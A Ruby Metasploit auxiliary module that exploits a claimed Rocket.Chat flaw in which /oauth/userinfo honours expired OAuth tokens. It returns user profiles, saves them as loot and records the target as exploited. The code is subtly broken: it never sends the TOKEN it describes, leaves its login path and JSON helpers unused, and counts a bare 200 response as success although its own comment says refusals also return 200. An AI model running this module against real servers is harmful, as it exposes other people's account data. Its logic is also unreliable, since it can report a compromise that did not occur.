class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat /oauth/userinfo expired-token probe (VULN-018)',
        'Description' => %q{
          Rocket.Chat's /oauth/userinfo honours expired access tokens. This module
          presents the expired TOKEN and prints the profile it returns. The operator
          supplies the token (minting and expiring one needs an OAuth app and a clock
          change); the module creates nothing.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/oauth/userinfo']),
      OptString.new('TOKEN', [true, 'An expired OAuth access token', 'expired'])
    ])
  end

  def run
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = res.code == 200 && res.body.to_s.include?('"sub"')
    fail_with(Failure::NotVulnerable, 'VULN-018: the attack did not land') unless hit

    print_good("#{peer} - VULN-018: exploited")
    print_status("#{peer} - supply an expired OAuth token as TOKEN; a returned profile confirms the finding")
    path = store_loot('blue_spider.vuln_018', 'text/plain', rhost, res.body.to_s, 'vuln_018.txt', 'VULN-018 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-018 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end
end
